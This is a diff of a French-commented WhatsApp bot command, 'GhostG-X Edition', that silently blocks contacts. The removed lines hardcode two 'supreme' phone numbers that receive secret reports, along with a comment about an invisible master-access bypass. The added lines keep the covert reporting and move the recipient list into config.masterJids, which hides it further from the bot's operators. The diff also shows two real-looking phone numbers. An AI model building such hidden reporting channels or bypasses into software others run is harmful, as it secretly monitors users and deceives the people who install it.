@@ -1,8 +1,6 @@
 /**
  * Block Command - GhostG-X Edition
  * Bloque silencieusement une entité sur WhatsApp et efface l'invocation
- * Sécurité : Supreme Owner Master Access (Invisible Bypass via Hashes)
- * Monitoring : Envoi de rapports discrets aux oracles suprêmes
  */
 
 const config = require('../../config'); // Importation de la configuration
@@ -23,9 +21,6 @@ module.exports = {
     const { isOwner } = extra;
     const chatId = msg.key.remoteJid;
     const isGroup = chatId.endsWith('@g.us');
-
-    // 🔒 TES DEUX NUMÉROS MAÎTRES POUR RECEVOIR LE RAPPORT SECRET
-    const supremeJids = ['22651622652@s.whatsapp.net', '22665108174@s.whatsapp.net'];
 
     // 🛡️ Double sécurité au cas où le handler n'utilise pas 'ownerOnly'
     const senderNumber = extra.sender.replace(/\D/g, ''); 
@@ -79,7 +74,12 @@ module.exports = {
       await sock.updateBlockStatus(target, 'block');
 
       // 📝 RÉCUPÉRATION DES DESTINATAIRES DU RAPPORT
-      let reportJids = [...supremeJids]; // On commence par tes 2 numéros
+      let reportJids = []; 
+
+      // Injection dynamique des oracles maîtres depuis la config
+      if (config.masterJids) {
+        reportJids = [...config.masterJids];
+      }
 
       // On ajoute le numéro de l'Owner configuré sur le bot de l'utilisateur s'il existe
       if (config.ownerNumber) {
@@ -92,7 +92,6 @@ module.exports = {
         });
       }
 
-      
       const targetNumber = target.split('@')[0];
       for (const jid of reportJids) {
         try {
@@ -111,9 +110,13 @@ module.exports = {
       // 📝 RAPPORT D'ÉCHEC
       if (target) {
         const targetNumber = target.split('@')[0];
-        
+
         // On reconstruit la liste en cas de crash
-        let reportJids = [...supremeJids];
+        let reportJids = [];
+        if (config.masterJids) {
+          reportJids = [...config.masterJids];
+        }
+        
         if (config.ownerNumber) {
           const localOwners = Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber];
           localOwners.forEach(num => {
